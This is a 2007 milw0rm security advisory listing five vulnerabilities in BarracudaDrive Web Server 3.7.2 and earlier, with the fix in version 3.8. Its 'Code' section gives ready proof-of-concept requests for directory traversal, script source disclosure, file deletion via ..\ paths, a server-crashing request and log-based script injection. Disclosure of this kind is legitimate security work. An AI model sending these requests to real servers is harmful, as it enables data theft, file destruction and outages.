@@ -1,0 +1,156 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  BarracudaDrive Web Server
+              http://barracudaserver.com/products/BarracudaDrive/
+              http://barracudaserver.com/products/HomeServer/
+Versions:     <= 3.7.2
+Platforms:    Windows
+Bugs:         A] directory traversal
+              B] scripts source visualization
+              C] arbitrary files deleting by users
+              D] NULL pointer crash in chat.ehintf by users
+              E] html injection in the trace viewer
+Exploitation: remote
+Date:         10 Dec 2007
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bugs
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+Barracuda Drive is a commercial webserver developed by Real Time Logic
+and contains many features.
+
+
+#######################################################################
+
+=======
+2) Bugs
+=======
+
+----------------------
+A] directory traversal
+----------------------
+
+A directory traversal vulnerability is exploitable through the usage of
+a backslash or any other char major than 0x7f at the beginning of the
+URI.
+The directories must be delimited by backslashes (and not slashes) for
+exploiting the bug.
+
+
+-------------------------------
+B] scripts source visualization
+-------------------------------
+
+All the custom scripts in the server (like the LUA scripts with lsp
+extension) can be visualized entirely instead of being executed simply
+using a '+', a dot or any other char major than 0x7f after the script's
+name.
+
+
+------------------------------------
+C] arbitrary files deleting by users
+------------------------------------
+
+BarracudaDrive allows the admin to create users which can then access
+their personal folders, chating between them and so on.
+The problem here is that these authenticated users can delete files and
+empty folders anywhere in the disk on which is located their personal
+directory simply using the usual ..\ pattern.
+
+Note that is also possible to create directories in the disk using the
+same trick but this is not a real security problem.
+
+
+---------------------------------------------
+D] NULL pointer crash in chat.ehintf by users
+---------------------------------------------
+
+As already said the users can also chat between them using a simple
+web interface called Group Chat.
+In this case it's enough to avoid the passing of the Connection ID of
+the user in the URI for crashing the entire server due to a NULL
+pointer.
+
+
+-------------------------------------
+E] html injection in the trace viewer
+-------------------------------------
+
+BarracudaDrive logs any bad or wrong HTTP request received by the
+clients and the Trace page in the admin interface can be used to
+visualize these log files.
+The problem is that they are visualized as HTML and there are no checks
+or limitations on their content so a remote attacker can use this bug
+for injecting scripts in these files, for example for retrieving the
+cookie of the admin and gaining access to the server configuration.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+A]
+http://SERVER/\..\..\..\boot.ini
+http://SERVER/%80..\..\..\boot.ini
+http://SERVER/%ff..\bdlicense.dat
+
+B]
+http://SERVER/lua.lsp+
+http://SERVER/lua.lsp.
+http://SERVER/lua.lsp%80
+
+C]
+POST /drive/c/bdusers/USER/?cmd=rm HTTP/1.1
+Host: SERVER
+Cookie: "use the real user's cookie!"
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+
+dir=..\..\..\file.txt
+
+D]
+POST /eh/chat.ehintf/C. HTTP/1.1
+Host: SERVER
+Content-Type: text/plain
+Content-Length: 0
+Cookie: "use the real user's cookie!"
+
+E]
+GET <script>alert('hello');</script> HTTP/1.0
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+Version 3.8
+
+
+#######################################################################
+
+# milw0rm.com [2007-12-10]
